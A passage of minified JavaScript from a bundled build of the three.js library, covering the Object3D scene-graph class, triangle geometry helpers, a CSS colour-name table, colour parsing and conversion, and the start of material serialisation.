B(0,0,1),hm={type:"added"},kw={type:"removed"},Qs={type:"childadded",child:null},Jc={type:"childremoved",child:null};class Gt extends Gr{constructor(){super(),this.isObject3D=!0,Object.defineProperty(this,"id",{value:Rw++}),this.uuid=io(),this.name="",this.type="Object3D",this.parent=null,this.children=[],this.up=Gt.DEFAULT_UP.clone();const e=new B,n=new ci,i=new so,s=new B(1,1,1);function r(){i.setFromEuler(n,!1)}function a(){n.setFromQuaternion(i,void 0,!1)}n._onChange(r),i._onChange(a),Object.defineProperties(this,{position:{configurable:!0,enumerable:!0,value:e},rotation:{configurable:!0,enumerable:!0,value:n},quaternion:{configurable:!0,enumerable:!0,value:i},scale:{configurable:!0,enumerable:!0,value:s},modelViewMatrix:{value:new _t},normalMatrix:{value:new Fe}}),this.matrix=new _t,this.matrixWorld=new _t,this.matrixAutoUpdate=Gt.DEFAULT_MATRIX_AUTO_UPDATE,this.matrixWorldAutoUpdate=Gt.DEFAULT_MATRIX_WORLD_AUTO_UPDATE,this.matrixWorldNeedsUpdate=!1,this.layers=new $0,this.visible=!0,this.castShadow=!1,this.receiveShadow=!1,this.frustumCulled=!0,this.renderOrder=0,this.animations=[],this.customDepthMaterial=void 0,this.customDistanceMaterial=void 0,this.userData={}}onBeforeShadow(){}onAfterShadow(){}onBeforeRender(){}onAfterRender(){}applyMatrix4(e){this.matrixAutoUpdate&&this.updateMatrix(),this.matrix.premultiply(e),this.matrix.decompose(this.position,this.quaternion,this.scale)}applyQuaternion(e){return this.quaternion.premultiply(e),this}setRotationFromAxisAngle(e,n){this.quaternion.setFromAxisAngle(e,n)}setRotationFromEuler(e){this.quaternion.setFromEuler(e,!0)}setRotationFromMatrix(e){this.quaternion.setFromRotationMatrix(e)}setRotationFromQuaternion(e){this.quaternion.copy(e)}rotateOnAxis(e,n){return Js.setFromAxisAngle(e,n),this.quaternion.multiply(Js),this}rotateOnWorldAxis(e,n){return Js.setFromAxisAngle(e,n),this.quaternion.premultiply(Js),this}rotateX(e){return this.rotateOnAxis(um,e)}rotateY(e){return this.rotateOnAxis(dm,e)}rotateZ(e){return this.rotateOnAxis(pm,e)}translateOnAxis(e,n){return cm.copy(e).applyQuaternion(this.quaternion),this.position.add(cm.multiplyScalar(n)),this}translateX(e){return this.translateOnAxis(um,e)}translateY(e){return this.translateOnAxis(dm,e)}translateZ(e){return this.translateOnAxis(pm,e)}localToWorld(e){return this.updateWorldMatrix(!0,!1),e.applyMatrix4(this.matrixWorld)}worldToLocal(e){return this.updateWorldMatrix(!0,!1),e.applyMatrix4(fi.copy(this.matrixWorld).invert())}lookAt(e,n,i){e.isVector3?Do.copy(e):Do.set(e,n,i);const s=this.parent;this.updateWorldMatrix(!0,!1),sa.setFromMatrixPosition(this.matrixWorld),this.isCamera||this.isLight?fi.lookAt(sa,Do,this.up):fi.lookAt(Do,sa,this.up),this.quaternion.setFromRotationMatrix(fi),s&&(fi.extractRotation(s.matrixWorld),Js.setFromRotationMatrix(fi),this.quaternion.premultiply(Js.invert()))}add(e){if(arguments.length>1){for(let n=0;n<arguments.length;n++)this.add(arguments[n]);return this}return e===this?(Qe("Object3D.add: object can't be added as a child of itself.",e),this):(e&&e.isObject3D?(e.removeFromParent(),e.parent=this,this.children.push(e),e.dispatchEvent(hm),Qs.child=e,this.dispatchEvent(Qs),Qs.child=null):Qe("Object3D.add: object not an instance of THREE.Object3D.",e),this)}remove(e){if(arguments.length>1){for(let i=0;i<arguments.length;i++)this.remove(arguments[i]);return this}const n=this.children.indexOf(e);return n!==-1&&(e.parent=null,this.children.splice(n,1),e.dispatchEvent(kw),Jc.child=e,this.dispatchEvent(Jc),Jc.child=null),this}removeFromParent(){const e=this.parent;return e!==null&&e.remove(this),this}clear(){return this.remove(...this.children)}attach(e){return this.updateWorldMatrix(!0,!1),fi.copy(this.matrixWorld).invert(),e.parent!==null&&(e.parent.updateWorldMatrix(!0,!1),fi.multiply(e.parent.matrixWorld)),e.applyMatrix4(fi),e.removeFromParent(),e.parent=this,this.children.push(e),e.updateWorldMatrix(!1,!0),e.dispatchEvent(hm),Qs.child=e,this.dispatchEvent(Qs),Qs.child=null,this}getObjectById(e){return this.getObjectByProperty("id",e)}getObjectByName(e){return this.getObjectByProperty("name",e)}getObjectByProperty(e,n){if(this[e]===n)return this;for(let i=0,s=this.children.length;i<s;i++){const a=this.children[i].getObjectByProperty(e,n);if(a!==void 0)return a}}getObjectsByProperty(e,n,i=[]){this[e]===n&&i.push(this);const s=this.children;for(let r=0,a=s.length;r<a;r++)s[r].getObjectsByProperty(e,n,i);return i}getWorldPosition(e){return this.updateWorldMatrix(!0,!1),e.setFromMatrixPosition(this.matrixWorld)}getWorldQuaternion(e){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(sa,e,Pw),e}getWorldScale(e){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(sa,Lw,e),e}getWorldDirection(e){this.updateWorldMatrix(!0,!1);const n=this.matrixWorld.elements;return e.set(n[8],n[9],n[10]).normalize()}raycast(){}traverse(e){e(this);const n=this.children;for(let i=0,s=n.length;i<s;i++)n[i].traverse(e)}traverseVisible(e){if(this.visible===!1)return;e(this);const n=this.children;for(let i=0,s=n.length;i<s;i++)n[i].traverseVisible(e)}traverseAncestors(e){const n=this.parent;n!==null&&(e(n),n.traverseAncestors(e))}updateMatrix(){this.matrix.compose(this.position,this.quaternion,this.scale),this.matrixWorldNeedsUpdate=!0}updateMatrixWorld(e){this.matrixAutoUpdate&&this.updateMatrix(),(this.matrixWorldNeedsUpdate||e)&&(this.matrixWorldAutoUpdate===!0&&(this.parent===null?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix)),this.matrixWorldNeedsUpdate=!1,e=!0);const n=this.children;for(let i=0,s=n.length;i<s;i++)n[i].updateMatrixWorld(e)}updateWorldMatrix(e,n){const i=this.parent;if(e===!0&&i!==null&&i.updateWorldMatrix(!0,!1),this.matrixAutoUpdate&&this.updateMatrix(),this.matrixWorldAutoUpdate===!0&&(this.parent===null?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix)),n===!0){const s=this.children;for(let r=0,a=s.length;r<a;r++)s[r].updateWorldMatrix(!1,!0)}}toJSON(e){const n=e===void 0||typeof e=="string",i={};n&&(e={geometries:{},materials:{},textures:{},images:{},shapes:{},skeletons:{},animations:{},nodes:{}},i.metadata={version:4.7,type:"Object",generator:"Object3D.toJSON"});const s={};s.uuid=this.uuid,s.type=this.type,this.name!==""&&(s.name=this.name),this.castShadow===!0&&(s.castShadow=!0),this.receiveShadow===!0&&(s.receiveShadow=!0),this.visible===!1&&(s.visible=!1),this.frustumCulled===!1&&(s.frustumCulled=!1),this.renderOrder!==0&&(s.renderOrder=this.renderOrder),Object.keys(this.userData).length>0&&(s.userData=this.userData),s.layers=this.layers.mask,s.matrix=this.matrix.toArray(),s.up=this.up.toArray(),this.matrixAutoUpdate===!1&&(s.matrixAutoUpdate=!1),this.isInstancedMesh&&(s.type="InstancedMesh",s.count=this.count,s.instanceMatrix=this.instanceMatrix.toJSON(),this.instanceColor!==null&&(s.instanceColor=this.instanceColor.toJSON())),this.isBatchedMesh&&(s.type="BatchedMesh",s.perObjectFrustumCulled=this.perObjectFrustumCulled,s.sortObjects=this.sortObjects,s.drawRanges=this._drawRanges,s.reservedRanges=this._reservedRanges,s.geometryInfo=this._geometryInfo.map(o=>({...o,boundingBox:o.boundingBox?o.boundingBox.toJSON():void 0,boundingSphere:o.boundingSphere?o.boundingSphere.toJSON():void 0})),s.instanceInfo=this._instanceInfo.map(o=>({...o})),s.availableInstanceIds=this._availableInstanceIds.slice(),s.availableGeometryIds=this._availableGeometryIds.slice(),s.nextIndexStart=this._nextIndexStart,s.nextVertexStart=this._nextVertexStart,s.geometryCount=this._geometryCount,s.maxInstanceCount=this._maxInstanceCount,s.maxVertexCount=this._maxVertexCount,s.maxIndexCount=this._maxIndexCount,s.geometryInitialized=this._geometryInitialized,s.matricesTexture=this._matricesTexture.toJSON(e),s.indirectTexture=this._indirectTexture.toJSON(e),this._colorsTexture!==null&&(s.colorsTexture=this._colorsTexture.toJSON(e)),this.boundingSphere!==null&&(s.boundingSphere=this.boundingSphere.toJSON()),this.boundingBox!==null&&(s.boundingBox=this.boundingBox.toJSON()));function r(o,l){return o[l.uuid]===void 0&&(o[l.uuid]=l.toJSON(e)),l.uuid}if(this.isScene)this.background&&(this.background.isColor?s.background=this.background.toJSON():this.background.isTexture&&(s.background=this.background.toJSON(e).uuid)),this.environment&&this.environment.isTexture&&this.environment.isRenderTargetTexture!==!0&&(s.environment=this.environment.toJSON(e).uuid);else if(this.isMesh||this.isLine||this.isPoints){s.geometry=r(e.geometries,this.geometry);const o=this.geometry.parameters;if(o!==void 0&&o.shapes!==void 0){const l=o.shapes;if(Array.isArray(l))for(let c=0,d=l.length;c<d;c++){const p=l[c];r(e.shapes,p)}else r(e.shapes,l)}}if(this.isSkinnedMesh&&(s.bindMode=this.bindMode,s.bindMatrix=this.bindMatrix.toArray(),this.skeleton!==void 0&&(r(e.skeletons,this.skeleton),s.skeleton=this.skeleton.uuid)),this.material!==void 0)if(Array.isArray(this.material)){const o=[];for(let l=0,c=this.material.length;l<c;l++)o.push(r(e.materials,this.material[l]));s.material=o}else s.material=r(e.materials,this.material);if(this.children.length>0){s.children=[];for(let o=0;o<this.children.length;o++)s.children.push(this.children[o].toJSON(e).object)}if(this.animations.length>0){s.animations=[];for(let o=0;o<this.animations.length;o++){const l=this.animations[o];s.animations.push(r(e.animations,l))}}if(n){const o=a(e.geometries),l=a(e.materials),c=a(e.textures),d=a(e.images),p=a(e.shapes),h=a(e.skeletons),f=a(e.animations),_=a(e.nodes);o.length>0&&(i.geometries=o),l.length>0&&(i.materials=l),c.length>0&&(i.textures=c),d.length>0&&(i.images=d),p.length>0&&(i.shapes=p),h.length>0&&(i.skeletons=h),f.length>0&&(i.animations=f),_.length>0&&(i.nodes=_)}return i.object=s,i;function a(o){const l=[];for(const c in o){const d=o[c];delete d.metadata,l.push(d)}return l}}clone(e){return new this.constructor().copy(this,e)}copy(e,n=!0){if(this.name=e.name,this.up.copy(e.up),this.position.copy(e.position),this.rotation.order=e.rotation.order,this.quaternion.copy(e.quaternion),this.scale.copy(e.scale),this.matrix.copy(e.matrix),this.matrixWorld.copy(e.matrixWorld),this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrixWorldAutoUpdate=e.matrixWorldAutoUpdate,this.matrixWorldNeedsUpdate=e.matrixWorldNeedsUpdate,this.layers.mask=e.layers.mask,this.visible=e.visible,this.castShadow=e.castShadow,this.receiveShadow=e.receiveShadow,this.frustumCulled=e.frustumCulled,this.renderOrder=e.renderOrder,this.animations=e.animations.slice(),this.userData=JSON.parse(JSON.stringify(e.userData)),n===!0)for(let i=0;i<e.children.length;i++){const s=e.children[i];this.add(s.clone())}return this}}Gt.DEFAULT_UP=new B(0,1,0);Gt.DEFAULT_MATRIX_AUTO_UPDATE=!0;Gt.DEFAULT_MATRIX_WORLD_AUTO_UPDATE=!0;const zn=new B,mi=new B,Qc=new B,gi=new B,er=new B,tr=new B,fm=new B,eu=new B,tu=new B,nu=new B,iu=new Mt,su=new Mt,ru=new Mt;class Wn{constructor(e=new B,n=new B,i=new B){this.a=e,this.b=n,this.c=i}static getNormal(e,n,i,s){s.subVectors(i,n),zn.subVectors(e,n),s.cross(zn);const r=s.lengthSq();return r>0?s.multiplyScalar(1/Math.sqrt(r)):s.set(0,0,0)}static getBarycoord(e,n,i,s,r){zn.subVectors(s,n),mi.subVectors(i,n),Qc.subVectors(e,n);const a=zn.dot(zn),o=zn.dot(mi),l=zn.dot(Qc),c=mi.dot(mi),d=mi.dot(Qc),p=a*c-o*o;if(p===0)return r.set(0,0,0),null;const h=1/p,f=(c*l-o*d)*h,_=(a*d-o*l)*h;return r.set(1-f-_,_,f)}static containsPoint(e,n,i,s){return this.getBarycoord(e,n,i,s,gi)===null?!1:gi.x>=0&&gi.y>=0&&gi.x+gi.y<=1}static getInterpolation(e,n,i,s,r,a,o,l){return this.getBarycoord(e,n,i,s,gi)===null?(l.x=0,l.y=0,"z"in l&&(l.z=0),"w"in l&&(l.w=0),null):(l.setScalar(0),l.addScaledVector(r,gi.x),l.addScaledVector(a,gi.y),l.addScaledVector(o,gi.z),l)}static getInterpolatedAttribute(e,n,i,s,r,a){return iu.setScalar(0),su.setScalar(0),ru.setScalar(0),iu.fromBufferAttribute(e,n),su.fromBufferAttribute(e,i),ru.fromBufferAttribute(e,s),a.setScalar(0),a.addScaledVector(iu,r.x),a.addScaledVector(su,r.y),a.addScaledVector(ru,r.z),a}static isFrontFacing(e,n,i,s){return zn.subVectors(i,n),mi.subVectors(e,n),zn.cross(mi).dot(s)<0}set(e,n,i){return this.a.copy(e),this.b.copy(n),this.c.copy(i),this}setFromPointsAndIndices(e,n,i,s){return this.a.copy(e[n]),this.b.copy(e[i]),this.c.copy(e[s]),this}setFromAttributeAndIndices(e,n,i,s){return this.a.fromBufferAttribute(e,n),this.b.fromBufferAttribute(e,i),this.c.fromBufferAttribute(e,s),this}clone(){return new this.constructor().copy(this)}copy(e){return this.a.copy(e.a),this.b.copy(e.b),this.c.copy(e.c),this}getArea(){return zn.subVectors(this.c,this.b),mi.subVectors(this.a,this.b),zn.cross(mi).length()*.5}getMidpoint(e){return e.addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)}getNormal(e){return Wn.getNormal(this.a,this.b,this.c,e)}getPlane(e){return e.setFromCoplanarPoints(this.a,this.b,this.c)}getBarycoord(e,n){return Wn.getBarycoord(e,this.a,this.b,this.c,n)}getInterpolation(e,n,i,s,r){return Wn.getInterpolation(e,this.a,this.b,this.c,n,i,s,r)}containsPoint(e){return Wn.containsPoint(e,this.a,this.b,this.c)}isFrontFacing(e){return Wn.isFrontFacing(this.a,this.b,this.c,e)}intersectsBox(e){return e.intersectsTriangle(this)}closestPointToPoint(e,n){const i=this.a,s=this.b,r=this.c;let a,o;er.subVectors(s,i),tr.subVectors(r,i),eu.subVectors(e,i);const l=er.dot(eu),c=tr.dot(eu);if(l<=0&&c<=0)return n.copy(i);tu.subVectors(e,s);const d=er.dot(tu),p=tr.dot(tu);if(d>=0&&p<=d)return n.copy(s);const h=l*p-d*c;if(h<=0&&l>=0&&d<=0)return a=l/(l-d),n.copy(i).addScaledVector(er,a);nu.subVectors(e,r);const f=er.dot(nu),_=tr.dot(nu);if(_>=0&&f<=_)return n.copy(r);const y=f*c-l*_;if(y<=0&&c>=0&&_<=0)return o=c/(c-_),n.copy(i).addScaledVector(tr,o);const m=d*_-f*p;if(m<=0&&p-d>=0&&f-_>=0)return fm.subVectors(r,s),o=(p-d)/(p-d+(f-_)),n.copy(s).addScaledVector(fm,o);const u=1/(m+y+h);return a=y*u,o=h*u,n.copy(i).addScaledVector(er,a).addScaledVector(tr,o)}equals(e){return e.a.equals(this.a)&&e.b.equals(this.b)&&e.c.equals(this.c)}}const K0={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074},Bi={h:0,s:0,l:0},Io={h:0,s:0,l:0};function au(t,e,n){return n<0&&(n+=1),n>1&&(n-=1),n<1/6?t+(e-t)*6*n:n<1/2?e:n<2/3?t+(e-t)*6*(2/3-n):t}class Ie{constructor(e,n,i){return this.isColor=!0,this.r=1,this.g=1,this.b=1,this.set(e,n,i)}set(e,n,i){if(n===void 0&&i===void 0){const s=e;s&&s.isColor?this.copy(s):typeof s=="number"?this.setHex(s):typeof s=="string"&&this.setStyle(s)}else this.setRGB(e,n,i);return this}setScalar(e){return this.r=e,this.g=e,this.b=e,this}setHex(e,n=Pn){return e=Math.floor(e),this.r=(e>>16&255)/255,this.g=(e>>8&255)/255,this.b=(e&255)/255,Ye.colorSpaceToWorking(this,n),this}setRGB(e,n,i,s=Ye.workingColorSpace){return this.r=e,this.g=n,this.b=i,Ye.colorSpaceToWorking(this,s),this}setHSL(e,n,i,s=Ye.workingColorSpace){if(e=xw(e,1),n=je(n,0,1),i=je(i,0,1),n===0)this.r=this.g=this.b=i;else{const r=i<=.5?i*(1+n):i+n-i*n,a=2*i-r;this.r=au(a,r,e+1/3),this.g=au(a,r,e),this.b=au(a,r,e-1/3)}return Ye.colorSpaceToWorking(this,s),this}setStyle(e,n=Pn){function i(r){r!==void 0&&parseFloat(r)<1&&Ne("Color: Alpha component of "+e+" will be ignored.")}let s;if(s=/^(\w+)\(([^\)]*)\)/.exec(e)){let r;const a=s[1],o=s[2];switch(a){case"rgb":case"rgba":if(r=/^\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(o))return i(r[4]),this.setRGB(Math.min(255,parseInt(r[1],10))/255,Math.min(255,parseInt(r[2],10))/255,Math.min(255,parseInt(r[3],10))/255,n);if(r=/^\s*(\d+)\%\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(o))return i(r[4]),this.setRGB(Math.min(100,parseInt(r[1],10))/100,Math.min(100,parseInt(r[2],10))/100,Math.min(100,parseInt(r[3],10))/100,n);break;case"hsl":case"hsla":if(r=/^\s*(\d*\.?\d+)\s*,\s*(\d*\.?\d+)\%\s*,\s*(\d*\.?\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(o))return i(r[4]),this.setHSL(parseFloat(r[1])/360,parseFloat(r[2])/100,parseFloat(r[3])/100,n);break;default:Ne("Color: Unknown color model "+e)}}else if(s=/^\#([A-Fa-f\d]+)$/.exec(e)){const r=s[1],a=r.length;if(a===3)return this.setRGB(parseInt(r.charAt(0),16)/15,parseInt(r.charAt(1),16)/15,parseInt(r.charAt(2),16)/15,n);if(a===6)return this.setHex(parseInt(r,16),n);Ne("Color: Invalid hex color "+e)}else if(e&&e.length>0)return this.setColorName(e,n);return this}setColorName(e,n=Pn){const i=K0[e.toLowerCase()];return i!==void 0?this.setHex(i,n):Ne("Color: Unknown color "+e),this}clone(){return new this.constructor(this.r,this.g,this.b)}copy(e){return this.r=e.r,this.g=e.g,this.b=e.b,this}copySRGBToLinear(e){return this.r=Ti(e.r),this.g=Ti(e.g),this.b=Ti(e.b),this}copyLinearToSRGB(e){return this.r=Tr(e.r),this.g=Tr(e.g),this.b=Tr(e.b),this}convertSRGBToLinear(){return this.copySRGBToLinear(this),this}convertLinearToSRGB(){return this.copyLinearToSRGB(this),this}getHex(e=Pn){return Ye.workingToColorSpace(Yt.copy(this),e),Math.round(je(Yt.r*255,0,255))*65536+Math.round(je(Yt.g*255,0,255))*256+Math.round(je(Yt.b*255,0,255))}getHexString(e=Pn){return("000000"+this.getHex(e).toString(16)).slice(-6)}getHSL(e,n=Ye.workingColorSpace){Ye.workingToColorSpace(Yt.copy(this),n);const i=Yt.r,s=Yt.g,r=Yt.b,a=Math.max(i,s,r),o=Math.min(i,s,r);let l,c;const d=(o+a)/2;if(o===a)l=0,c=0;else{const p=a-o;switch(c=d<=.5?p/(a+o):p/(2-a-o),a){case i:l=(s-r)/p+(s<r?6:0);break;case s:l=(r-i)/p+2;break;case r:l=(i-s)/p+4;break}l/=6}return e.h=l,e.s=c,e.l=d,e}getRGB(e,n=Ye.workingColorSpace){return Ye.workingToColorSpace(Yt.copy(this),n),e.r=Yt.r,e.g=Yt.g,e.b=Yt.b,e}getStyle(e=Pn){Ye.workingToColorSpace(Yt.copy(this),e);const n=Yt.r,i=Yt.g,s=Yt.b;return e!==Pn?`color(${e} ${n.toFixed(3)} ${i.toFixed(3)} ${s.toFixed(3)})`:`rgb(${Math.round(n*255)},${Math.round(i*255)},${Math.round(s*255)})`}offsetHSL(e,n,i){return this.getHSL(Bi),this.setHSL(Bi.h+e,Bi.s+n,Bi.l+i)}add(e){return this.r+=e.r,this.g+=e.g,this.b+=e.b,this}addColors(e,n){return this.r=e.r+n.r,this.g=e.g+n.g,this.b=e.b+n.b,this}addScalar(e){return this.r+=e,this.g+=e,this.b+=e,this}sub(e){return this.r=Math.max(0,this.r-e.r),this.g=Math.max(0,this.g-e.g),this.b=Math.max(0,this.b-e.b),this}multiply(e){return this.r*=e.r,this.g*=e.g,this.b*=e.b,this}multiplyScalar(e){return this.r*=e,this.g*=e,this.b*=e,this}lerp(e,n){return this.r+=(e.r-this.r)*n,this.g+=(e.g-this.g)*n,this.b+=(e.b-this.b)*n,this}lerpColors(e,n,i){return this.r=e.r+(n.r-e.r)*i,this.g=e.g+(n.g-e.g)*i,this.b=e.b+(n.b-e.b)*i,this}lerpHSL(e,n){this.getHSL(Bi),e.getHSL(Io);const i=Hc(Bi.h,Io.h,n),s=Hc(Bi.s,Io.s,n),r=Hc(Bi.l,Io.l,n);return this.setHSL(i,s,r),this}setFromVector3(e){return this.r=e.x,this.g=e.y,this.b=e.z,this}applyMatrix3(e){const n=this.r,i=this.g,s=this.b,r=e.elements;return this.r=r[0]*n+r[3]*i+r[6]*s,this.g=r[1]*n+r[4]*i+r[7]*s,this.b=r[2]*n+r[5]*i+r[8]*s,this}equals(e){return e.r===this.r&&e.g===this.g&&e.b===this.b}fromArray(e,n=0){return this.r=e[n],this.g=e[n+1],this.b=e[n+2],this}toArray(e=[],n=0){return e[n]=this.r,e[n+1]=this.g,e[n+2]=this.b,e}fromBufferAttribute(e,n){return this.r=e.getX(n),this.g=e.getY(n),this.b=e.getZ(n),this}toJSON(){return this.getHex()}*[Symbol.iterator](){yield this.r,yield this.g,yield this.b}}const Yt=new Ie;Ie.NAMES=K0;let Nw=0;class Wr extends Gr{constructor(){super(),this.isMaterial=!0,Object.defineProperty(this,"id",{value:Nw++}),this.uuid=io(),this.name="",this.type="Material",this.blending=Er,this.side=cs,this.vertexColors=!1,this.opacity=1,this.transparent=!1,this.alphaHash=!1,this.blendSrc=md,this.blendDst=gd,this.blendEquation=Es,this.blendSrcAlpha=null,this.blendDstAlpha=null,this.blendEquationAlpha=null,this.blendColor=new Ie(0,0,0),this.blendAlpha=0,this.depthFunc=Dr,this.depthTest=!0,this.depthWrite=!0,this.stencilWriteMask=255,this.stencilFunc=Qf,this.stencilRef=0,this.stencilFuncMask=255,this.stencilFail=Xs,this.stencilZFail=Xs,this.stencilZPass=Xs,this.stencilWrite=!1,this.clippingPlanes=null,this.clipIntersection=!1,this.clipShadows=!1,this.shadowSide=null,this.colorWrite=!0,this.precision=null,this.polygonOffset=!1,this.polygonOffsetFactor=0,this.polygonOffsetUnits=0,this.dithering=!1,this.alphaToCoverage=!1,this.premultipliedAlpha=!1,this.forceSinglePass=!1,this.allowOverride=!0,this.visible=!0,this.toneMapped=!0,this.userData={},this.version=0,this._alphaTest=0}get alphaTest(){return this._alphaTest}set alphaTest(e){this._alphaTest>0!=e>0&&this.version++,this._alphaTest=e}onBeforeRender(){}onBeforeCompile(){}customProgramCacheKey(){return this.onBeforeCompile.toString()}setValues(e){if(e!==void 0)for(const n in e){const i=e[n];if(i===void 0){Ne(`Material: parameter '${n}' has value of undefined.`);continue}const s=this[n];if(s===void 0){Ne(`Material: '${n}' is not a property of THREE.${this.type}.`);continue}s&&s.isColor?s.set(i):s&&s.isVector3&&i&&i.isVector3?s.copy(i):this[n]=i}}toJSON(e){const n=e===void 0||typeof e=="string";n&&(e={textures:{},images:{}});const i={metadata:{version:4.7,type:"Material",generator:"Material.toJSON"}};i.uuid=this.uuid,i.type=this.type,this.name!==""&&(i.name=this.name),this.color&&this.color.isColor&&(i.color=this.color.getHex()),this.roughness!==void 0&&(i.roughness=this.roughness),this.metalness!==void 0&&(i.metalness=this.metalness),this.sheen!==void 0&&(i.sheen=this.sheen),this.sheenColor&&this.sheenColor.isColor&&(i.sheenColor=this.sheenColor.getHex()),this.sheenRoughness!==void 0&&(i.sheenRoughness=this.sheenRoughness),this.emissive&&this.emissive.isColor&&(i.emissive=this.emissive.getHex()),this.emissiveIntensity!==void 0&&this.emissiveIntensity!==1&&(i.emissiveIntensity=this.emissiveIntensity),this.specular&&this.specular.isColor&&(i.specular=this.specular.getHex()),this.specularIntensity!==void 0&&(i.specularIntensity=this.specularIntensity),this.specularColor&&this.specularColor.isColor&&(i.specularColor=this.specularColor.getHex()),this.shininess!==void 0&&(i.shininess=this.shininess),this.clearcoat!==void 0&&(i.clearcoat=this.clearcoat),this.clearcoatRoughness!==void 0&&(i.clearcoatRoughness=this.clearcoatRoughness),this.clearcoatMap&&this.clearcoatMap.isTexture&&(i.clearcoatMap=this.clearcoatMap.toJSON(e).uuid),this.clearcoatRoughnessMap&&this.clearcoatRoughnessMap.isTexture&&(i.clearcoatRoughnessMap=this.clearcoatRoughnessMap.toJSON(e).uuid),this.clearcoatNormalMap&&this.clearcoatNormalMap.isTexture&&(i.clearcoatNormalMap=this.clearcoatNormalMap.toJSON(e).uuid,i.clearcoatNormalScale=this.clearcoatNormalScale.toArray()),this.sheenColorMap&&this.sheenColorMap.isTexture&&(i.sheenColorMap=this.sheenColorMap.toJSON(e).uuid),this.sheenRoughnessMap&&this.sheenRoughnessMap.isTexture&&(i.sheenRoughnessMap=this.sheenRoughnessMap.toJSON(e).uuid),this.dispersion!==void 0&&(i.dispersion=this.dispersion),this.iridescence!==void 0&&(i.iridescence=this.iridescence),this.iridescenceIOR!==void 0&&(i.iridescenceIOR=this.iridescenceIOR),this.iridescenceThicknessRange!==void 0&&(i.iridescenceThicknessRange=this.iridescenceThicknessRange),this.iridescenceMap&&this.iridescenceMap.isTexture&&(i.iridescenceMap=this.iridescenceMap.toJSON(e).uuid),this.iridescenceThicknessMap&&this.iridescenceThicknessMap.isTexture&&(i.iridescenceThicknessMap=this.iridescenceThicknessMap.toJSON(e).uuid),this.anisotropy!==void 0&&(i.anisotropy=this.anisotropy),this.anisotropyRotation!==void 0&&(i.anisotropyRotation=this.anisotropyRotation),this.anisotropyMap&&this.anisotropyMap.isTexture&&(i.anisotropyMap=this.anisotropyMap.toJSON(e).uuid),this.map&&this.map.isTexture&&(i.map=this.map.toJSON(e).uuid),this.matcap&&this.matcap.isTexture&&(i.matcap=this.matcap.toJSON(e).uuid),this.alphaMap&&this.alphaMap.isTexture&&(i.alphaMap=this.alphaMap.toJSON(e).uuid),this.lightMap&&this.lightMap.isTexture&&(i.lightMap=this.lightMap.toJSON(e).uuid,i.lightMapIntensity=this.lightMapIntensity),this.aoMap&&this.aoMap.isTexture&&(i.aoMap=this.aoMap.toJSON(e).uuid,i.aoMapIntensity=this.aoMapIntensity),this.bumpMap&&this.bumpMap.isTexture&&(i.bumpMap=this.bumpMap.toJSON(e).uuid,i.bumpScale=this.bumpScale),this.normalMap&&this.normalMap.isTexture&&(i.normalMap=this.normalMap.toJSON(e).uuid,i.normalMapType=this.normalMapType,i.normalScale=this.normalScale.toArray()),this.displacementMap&&this.displacementMap.isTexture&&(i.displacementMap=this.displacementMap.toJSON(e).uuid,i.displacementScale=this.displacementScale,i.displacementBias=this.displacementBias),this.roughnessMap&&this.roughnessMap.isTexture&&(i.roughnessMap=this.roughnessMap.toJSON(e).uuid),